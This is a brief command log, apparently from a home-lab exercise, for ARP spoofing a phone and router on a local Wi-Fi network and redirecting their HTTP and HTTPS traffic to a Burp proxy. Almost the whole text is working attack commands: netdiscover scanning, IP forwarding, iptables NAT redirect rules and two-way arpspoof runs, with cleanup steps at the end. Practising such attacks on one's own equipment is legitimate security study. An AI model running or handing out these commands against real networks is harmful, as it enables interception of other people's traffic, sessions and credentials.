ARP Spoofing Practice - Commands Log
========================================

Date: September 19, 2026
Target IP: 192.168.0.102 (Phone)
Gateway IP: 192.168.0.1 (Router)
Interface: wlan0

----------------------------------------
1. Network Scan
----------------------------------------
sudo netdiscover -r 192.168.0.0/24

----------------------------------------
2. IP Forwarding Enable
----------------------------------------
sudo sysctl -w net.ipv4.ip_forward=1

----------------------------------------
3. iptables Rules (Traffic Redirect to Burp)
----------------------------------------
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080

----------------------------------------
4. ARP Spoofing (Terminal 1 - Phone)
----------------------------------------
sudo arpspoof -i wlan0 -t 192.168.0.102 192.168.0.1

----------------------------------------
5. ARP Spoofing (Terminal 2 - Router)
----------------------------------------
sudo arpspoof -i wlan0 -t 192.168.0.1 192.168.0.102

----------------------------------------
6. Cleanup
----------------------------------------
sudo killall arpspoof
sudo sysctl -w net.ipv4.ip_forward=0
sudo iptables -F
sudo iptables -t nat -F
sudo ip neigh flush all
